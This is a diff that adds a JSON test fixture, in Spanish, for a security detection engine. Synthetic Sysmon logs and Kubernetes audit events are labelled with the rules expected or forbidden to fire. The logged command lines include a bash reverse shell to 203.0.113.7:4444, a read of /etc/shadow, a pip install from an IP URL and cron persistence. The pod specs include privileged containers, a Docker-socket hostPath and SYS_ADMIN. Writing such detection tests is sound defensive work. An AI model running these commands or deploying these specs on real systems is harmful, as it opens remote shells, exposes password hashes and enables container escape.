@@ -1,0 +1,276 @@
+[
+ {
+  "nombre": "Linux: reverse shell con bash -i >& /dev/tcp",
+  "fuente": "sysmon-linux",
+  "log": "Oct 22 10:00:00 srv-web01 sysmon: <Event><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-10-22T10:00:00.000000000Z\"/><EventRecordID>1</EventRecordID><Correlation/><Execution ProcessID=\"900\" ThreadID=\"900\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>srv-web01</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-10-22 10:00:00.000</Data><Data Name=\"ProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000001}</Data><Data Name=\"ProcessId\">4242</Data><Data Name=\"Image\">/usr/bin/bash</Data><Data Name=\"FileVersion\">-</Data><Data Name=\"Description\">-</Data><Data Name=\"Product\">-</Data><Data Name=\"Company\">-</Data><Data Name=\"OriginalFileName\">-</Data><Data Name=\"CommandLine\">bash -c bash -i &gt;&amp; /dev/tcp/203.0.113.7/4444 0&gt;&amp;1</Data><Data Name=\"CurrentDirectory\">/root</Data><Data Name=\"User\">root</Data><Data Name=\"LogonGuid\">{00000000-0000-0000-0000-000000000000}</Data><Data Name=\"LogonId\">0</Data><Data Name=\"TerminalSessionId\">3</Data><Data Name=\"IntegrityLevel\">no level</Data><Data Name=\"Hashes\">-</Data><Data Name=\"ParentProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000002}</Data><Data Name=\"ParentProcessId\">4000</Data><Data Name=\"ParentImage\">/usr/bin/bash</Data><Data Name=\"ParentCommandLine\">bash</Data><Data Name=\"ParentUser\">root</Data></EventData></Event>",
+  "esperadas": [
+   "lin_reverse_shell"
+  ]
+ },
+ {
+  "nombre": "Linux: ssh -i clave.pem NO es una shell inversa",
+  "fuente": "sysmon-linux",
+  "log": "Oct 22 10:00:00 srv-web01 sysmon: <Event><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-10-22T10:00:00.000000000Z\"/><EventRecordID>1</EventRecordID><Correlation/><Execution ProcessID=\"900\" ThreadID=\"900\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>srv-web01</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-10-22 10:00:00.000</Data><Data Name=\"ProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000001}</Data><Data Name=\"ProcessId\">4242</Data><Data Name=\"Image\">/usr/bin/ssh</Data><Data Name=\"FileVersion\">-</Data><Data Name=\"Description\">-</Data><Data Name=\"Product\">-</Data><Data Name=\"Company\">-</Data><Data Name=\"OriginalFileName\">-</Data><Data Name=\"CommandLine\">ssh -i /home/admin/.ssh/clave.pem admin@10.0.0.5</Data><Data Name=\"CurrentDirectory\">/root</Data><Data Name=\"User\">root</Data><Data Name=\"LogonGuid\">{00000000-0000-0000-0000-000000000000}</Data><Data Name=\"LogonId\">0</Data><Data Name=\"TerminalSessionId\">3</Data><Data Name=\"IntegrityLevel\">no level</Data><Data Name=\"Hashes\">-</Data><Data Name=\"ParentProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000002}</Data><Data Name=\"ParentProcessId\">4000</Data><Data Name=\"ParentImage\">/usr/bin/bash</Data><Data Name=\"ParentCommandLine\">bash</Data><Data Name=\"ParentUser\">root</Data></EventData></Event>",
+  "prohibidas": [
+   "lin_reverse_shell"
+  ]
+ },
+ {
+  "nombre": "Linux: crontab -l (listar) NO es persistencia",
+  "fuente": "sysmon-linux",
+  "log": "Oct 22 10:00:00 srv-web01 sysmon: <Event><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-10-22T10:00:00.000000000Z\"/><EventRecordID>1</EventRecordID><Correlation/><Execution ProcessID=\"900\" ThreadID=\"900\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>srv-web01</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-10-22 10:00:00.000</Data><Data Name=\"ProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000001}</Data><Data Name=\"ProcessId\">4242</Data><Data Name=\"Image\">/usr/bin/crontab</Data><Data Name=\"FileVersion\">-</Data><Data Name=\"Description\">-</Data><Data Name=\"Product\">-</Data><Data Name=\"Company\">-</Data><Data Name=\"OriginalFileName\">-</Data><Data Name=\"CommandLine\">crontab -l</Data><Data Name=\"CurrentDirectory\">/root</Data><Data Name=\"User\">root</Data><Data Name=\"LogonGuid\">{00000000-0000-0000-0000-000000000000}</Data><Data Name=\"LogonId\">0</Data><Data Name=\"TerminalSessionId\">3</Data><Data Name=\"IntegrityLevel\">no level</Data><Data Name=\"Hashes\">-</Data><Data Name=\"ParentProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000002}</Data><Data Name=\"ParentProcessId\">4000</Data><Data Name=\"ParentImage\">/usr/bin/bash</Data><Data Name=\"ParentCommandLine\">bash</Data><Data Name=\"ParentUser\">root</Data></EventData></Event>",
+  "prohibidas": [
+   "lin_cron_persistence"
+  ]
+ },
+ {
+  "nombre": "Linux: crontab - (instalar desde stdin) SI",
+  "fuente": "sysmon-linux",
+  "log": "Oct 22 10:00:00 srv-web01 sysmon: <Event><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-10-22T10:00:00.000000000Z\"/><EventRecordID>1</EventRecordID><Correlation/><Execution ProcessID=\"900\" ThreadID=\"900\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>srv-web01</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-10-22 10:00:00.000</Data><Data Name=\"ProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000001}</Data><Data Name=\"ProcessId\">4242</Data><Data Name=\"Image\">/usr/bin/crontab</Data><Data Name=\"FileVersion\">-</Data><Data Name=\"Description\">-</Data><Data Name=\"Product\">-</Data><Data Name=\"Company\">-</Data><Data Name=\"OriginalFileName\">-</Data><Data Name=\"CommandLine\">crontab -</Data><Data Name=\"CurrentDirectory\">/root</Data><Data Name=\"User\">root</Data><Data Name=\"LogonGuid\">{00000000-0000-0000-0000-000000000000}</Data><Data Name=\"LogonId\">0</Data><Data Name=\"TerminalSessionId\">3</Data><Data Name=\"IntegrityLevel\">no level</Data><Data Name=\"Hashes\">-</Data><Data Name=\"ParentProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000002}</Data><Data Name=\"ParentProcessId\">4000</Data><Data Name=\"ParentImage\">/usr/bin/bash</Data><Data Name=\"ParentCommandLine\">bash</Data><Data Name=\"ParentUser\">root</Data></EventData></Event>",
+  "esperadas": [
+   "lin_cron_persistence"
+  ]
+ },
+ {
+  "nombre": "Linux: cat /etc/crontab NO es persistencia",
+  "fuente": "sysmon-linux",
+  "log": "Oct 22 10:00:00 srv-web01 sysmon: <Event><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-10-22T10:00:00.000000000Z\"/><EventRecordID>1</EventRecordID><Correlation/><Execution ProcessID=\"900\" ThreadID=\"900\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>srv-web01</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-10-22 10:00:00.000</Data><Data Name=\"ProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000001}</Data><Data Name=\"ProcessId\">4242</Data><Data Name=\"Image\">/usr/bin/cat</Data><Data Name=\"FileVersion\">-</Data><Data Name=\"Description\">-</Data><Data Name=\"Product\">-</Data><Data Name=\"Company\">-</Data><Data Name=\"OriginalFileName\">-</Data><Data Name=\"CommandLine\">cat /etc/crontab</Data><Data Name=\"CurrentDirectory\">/root</Data><Data Name=\"User\">root</Data><Data Name=\"LogonGuid\">{00000000-0000-0000-0000-000000000000}</Data><Data Name=\"LogonId\">0</Data><Data Name=\"TerminalSessionId\">3</Data><Data Name=\"IntegrityLevel\">no level</Data><Data Name=\"Hashes\">-</Data><Data Name=\"ParentProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000002}</Data><Data Name=\"ParentProcessId\">4000</Data><Data Name=\"ParentImage\">/usr/bin/bash</Data><Data Name=\"ParentCommandLine\">bash</Data><Data Name=\"ParentUser\">root</Data></EventData></Event>",
+  "prohibidas": [
+   "lin_cron_persistence"
+  ]
+ },
+ {
+  "nombre": "Linux: pip install desde URL (Image es python3)",
+  "fuente": "sysmon-linux",
+  "log": "Oct 22 10:00:00 srv-web01 sysmon: <Event><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-10-22T10:00:00.000000000Z\"/><EventRecordID>1</EventRecordID><Correlation/><Execution ProcessID=\"900\" ThreadID=\"900\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>srv-web01</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-10-22 10:00:00.000</Data><Data Name=\"ProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000001}</Data><Data Name=\"ProcessId\">4242</Data><Data Name=\"Image\">/usr/bin/python3.11</Data><Data Name=\"FileVersion\">-</Data><Data Name=\"Description\">-</Data><Data Name=\"Product\">-</Data><Data Name=\"Company\">-</Data><Data Name=\"OriginalFileName\">-</Data><Data Name=\"CommandLine\">/usr/bin/python3 /usr/bin/pip install https://203.0.113.7/paquete.tar.gz</Data><Data Name=\"CurrentDirectory\">/root</Data><Data Name=\"User\">root</Data><Data Name=\"LogonGuid\">{00000000-0000-0000-0000-000000000000}</Data><Data Name=\"LogonId\">0</Data><Data Name=\"TerminalSessionId\">3</Data><Data Name=\"IntegrityLevel\">no level</Data><Data Name=\"Hashes\">-</Data><Data Name=\"ParentProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000002}</Data><Data Name=\"ParentProcessId\">4000</Data><Data Name=\"ParentImage\">/usr/bin/bash</Data><Data Name=\"ParentCommandLine\">bash</Data><Data Name=\"ParentUser\">root</Data></EventData></Event>",
+  "esperadas": [
+   "zta_sup_002_paquete_repositorio_no_aprobado"
+  ]
+ },
+ {
+  "nombre": "Linux: npm install con --registry propio externo (Image es node)",
+  "fuente": "sysmon-linux",
+  "log": "Oct 22 10:00:00 srv-web01 sysmon: <Event><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-10-22T10:00:00.000000000Z\"/><EventRecordID>1</EventRecordID><Correlation/><Execution ProcessID=\"900\" ThreadID=\"900\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>srv-web01</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-10-22 10:00:00.000</Data><Data Name=\"ProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000001}</Data><Data Name=\"ProcessId\">4242</Data><Data Name=\"Image\">/usr/bin/node</Data><Data Name=\"FileVersion\">-</Data><Data Name=\"Description\">-</Data><Data Name=\"Product\">-</Data><Data Name=\"Company\">-</Data><Data Name=\"OriginalFileName\">-</Data><Data Name=\"CommandLine\">node /usr/bin/npm install lodash --registry https://registro-raro.example</Data><Data Name=\"CurrentDirectory\">/root</Data><Data Name=\"User\">root</Data><Data Name=\"LogonGuid\">{00000000-0000-0000-0000-000000000000}</Data><Data Name=\"LogonId\">0</Data><Data Name=\"TerminalSessionId\">3</Data><Data Name=\"IntegrityLevel\">no level</Data><Data Name=\"Hashes\">-</Data><Data Name=\"ParentProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000002}</Data><Data Name=\"ParentProcessId\">4000</Data><Data Name=\"ParentImage\">/usr/bin/bash</Data><Data Name=\"ParentCommandLine\">bash</Data><Data Name=\"ParentUser\">root</Data></EventData></Event>",
+  "esperadas": [
+   "zta_sup_002_paquete_repositorio_no_aprobado"
+  ]
+ },
+ {
+  "nombre": "Linux: npm install desde el espejo interno NO",
+  "fuente": "sysmon-linux",
+  "log": "Oct 22 10:00:00 srv-web01 sysmon: <Event><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-10-22T10:00:00.000000000Z\"/><EventRecordID>1</EventRecordID><Correlation/><Execution ProcessID=\"900\" ThreadID=\"900\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>srv-web01</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-10-22 10:00:00.000</Data><Data Name=\"ProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000001}</Data><Data Name=\"ProcessId\">4242</Data><Data Name=\"Image\">/usr/bin/node</Data><Data Name=\"FileVersion\">-</Data><Data Name=\"Description\">-</Data><Data Name=\"Product\">-</Data><Data Name=\"Company\">-</Data><Data Name=\"OriginalFileName\">-</Data><Data Name=\"CommandLine\">node /usr/bin/npm install lodash --registry https://nexus.midominio.local/npm</Data><Data Name=\"CurrentDirectory\">/root</Data><Data Name=\"User\">root</Data><Data Name=\"LogonGuid\">{00000000-0000-0000-0000-000000000000}</Data><Data Name=\"LogonId\">0</Data><Data Name=\"TerminalSessionId\">3</Data><Data Name=\"IntegrityLevel\">no level</Data><Data Name=\"Hashes\">-</Data><Data Name=\"ParentProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000002}</Data><Data Name=\"ParentProcessId\">4000</Data><Data Name=\"ParentImage\">/usr/bin/bash</Data><Data Name=\"ParentCommandLine\">bash</Data><Data Name=\"ParentUser\">root</Data></EventData></Event>",
+  "prohibidas": [
+   "zta_sup_002_paquete_repositorio_no_aprobado"
+  ]
+ },
+ {
+  "nombre": "Linux: lectura de /etc/shadow",
+  "fuente": "sysmon-linux",
+  "log": "Oct 22 10:00:00 srv-web01 sysmon: <Event><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-10-22T10:00:00.000000000Z\"/><EventRecordID>1</EventRecordID><Correlation/><Execution ProcessID=\"900\" ThreadID=\"900\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>srv-web01</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-10-22 10:00:00.000</Data><Data Name=\"ProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000001}</Data><Data Name=\"ProcessId\">4242</Data><Data Name=\"Image\">/usr/bin/cat</Data><Data Name=\"FileVersion\">-</Data><Data Name=\"Description\">-</Data><Data Name=\"Product\">-</Data><Data Name=\"Company\">-</Data><Data Name=\"OriginalFileName\">-</Data><Data Name=\"CommandLine\">cat /etc/shadow</Data><Data Name=\"CurrentDirectory\">/root</Data><Data Name=\"User\">root</Data><Data Name=\"LogonGuid\">{00000000-0000-0000-0000-000000000000}</Data><Data Name=\"LogonId\">0</Data><Data Name=\"TerminalSessionId\">3</Data><Data Name=\"IntegrityLevel\">no level</Data><Data Name=\"Hashes\">-</Data><Data Name=\"ParentProcessGuid\">{8b3c2f1e-0000-0000-0000-000000000002}</Data><Data Name=\"ParentProcessId\">4000</Data><Data Name=\"ParentImage\">/usr/bin/bash</Data><Data Name=\"ParentCommandLine\">bash</Data><Data Name=\"ParentUser\">root</Data></EventData></Event>",
+  "esperadas": [
+   "lin_read_shadow"
+  ]
+ },
+ {
+  "nombre": "k8s: pod con el SEGUNDO contenedor privilegiado",
+  "fuente": "json",
+  "evento": {
+   "kind": "Event",
+   "apiVersion": "audit.k8s.io/v1",
+   "level": "RequestResponse",
+   "stage": "ResponseComplete",
+   "verb": "create",
+   "user": {
+    "username": "dev@empresa.local"
+   },
+   "objectRef": {
+    "resource": "pods",
+    "namespace": "default",
+    "name": "web",
+    "apiVersion": "v1"
+   },
+   "requestObject": {
+    "kind": "Pod",
+    "spec": {
+     "containers": [
+      {
+       "name": "app",
+       "image": "nginx"
+      },
+      {
+       "name": "sidecar",
+       "image": "busybox",
+       "securityContext": {
+        "privileged": true
+       }
+      }
+     ]
+    }
+   }
+  },
+  "esperadas": [
+   "k8s_pod_privilegiado"
+  ]
+ },
+ {
+  "nombre": "k8s: pod privilegiado en kube-system NO",
+  "fuente": "json",
+  "evento": {
+   "kind": "Event",
+   "apiVersion": "audit.k8s.io/v1",
+   "level": "RequestResponse",
+   "stage": "ResponseComplete",
+   "verb": "create",
+   "user": {
+    "username": "dev@empresa.local"
+   },
+   "objectRef": {
+    "resource": "pods",
+    "namespace": "kube-system",
+    "name": "web",
+    "apiVersion": "v1"
+   },
+   "requestObject": {
+    "kind": "Pod",
+    "spec": {
+     "containers": [
+      {
+       "name": "cni",
+       "image": "calico",
+       "securityContext": {
+        "privileged": true
+       }
+      }
+     ]
+    }
+   }
+  },
+  "prohibidas": [
+   "k8s_pod_privilegiado"
+  ]
+ },
+ {
+  "nombre": "k8s: pod con hostPath al socket de Docker",
+  "fuente": "json",
+  "evento": {
+   "kind": "Event",
+   "apiVersion": "audit.k8s.io/v1",
+   "level": "RequestResponse",
+   "stage": "ResponseComplete",
+   "verb": "create",
+   "user": {
+    "username": "dev@empresa.local"
+   },
+   "objectRef": {
+    "resource": "pods",
+    "namespace": "default",
+    "name": "web",
+    "apiVersion": "v1"
+   },
+   "requestObject": {
+    "kind": "Pod",
+    "spec": {
+     "containers": [
+      {
+       "name": "app",
+       "image": "nginx"
+      }
+     ],
+     "volumes": [
+      {
+       "name": "sock",
+       "hostPath": {
+        "path": "/var/run/docker.sock",
+        "type": "Socket"
+       }
+      }
+     ]
+    }
+   }
+  },
+  "esperadas": [
+   "k8s_montaje_hostpath"
+  ]
+ },
+ {
+  "nombre": "k8s: pod normal sin privilegios ni hostPath",
+  "fuente": "json",
+  "evento": {
+   "kind": "Event",
+   "apiVersion": "audit.k8s.io/v1",
+   "level": "RequestResponse",
+   "stage": "ResponseComplete",
+   "verb": "create",
+   "user": {
+    "username": "dev@empresa.local"
+   },
+   "objectRef": {
+    "resource": "pods",
+    "namespace": "default",
+    "name": "web",
+    "apiVersion": "v1"
+   },
+   "requestObject": {
+    "kind": "Pod",
+    "spec": {
+     "containers": [
+      {
+       "name": "app",
+       "image": "nginx",
+       "securityContext": {
+        "runAsNonRoot": true
+       }
+      }
+     ]
+    }
+   }
+  },
+  "prohibidas": [
+   "k8s_pod_privilegiado",
+   "k8s_montaje_hostpath",
+   "k8s_capacidades_peligrosas"
+  ]
+ },
+ {
+  "nombre": "k8s: capacidad SYS_ADMIN en un contenedor",
+  "fuente": "json",
+  "evento": {
+   "kind": "Event",
+   "apiVersion": "audit.k8s.io/v1",
+   "level": "RequestResponse",
+   "stage": "ResponseComplete",
+   "verb": "create",
+   "user": {
+    "username": "dev@empresa.local"
+   },
+   "objectRef": {
+    "resource": "pods",
+    "namespace": "default",
+    "name": "web",
+    "apiVersion": "v1"
+   },
+   "requestObject": {
+    "kind": "Pod",
+    "spec": {
+     "containers": [
+      {
+       "name": "app",
+       "image": "nginx",
+       "securityContext": {
+        "capabilities": {
+         "add": [
+          "NET_BIND_SERVICE",
+          "SYS_ADMIN"
+         ]
+        }
+       }
+      }
+     ]
+    }
+   }
+  },
+  "esperadas": [
+   "k8s_capacidades_peligrosas"
+  ]
+ }
+]
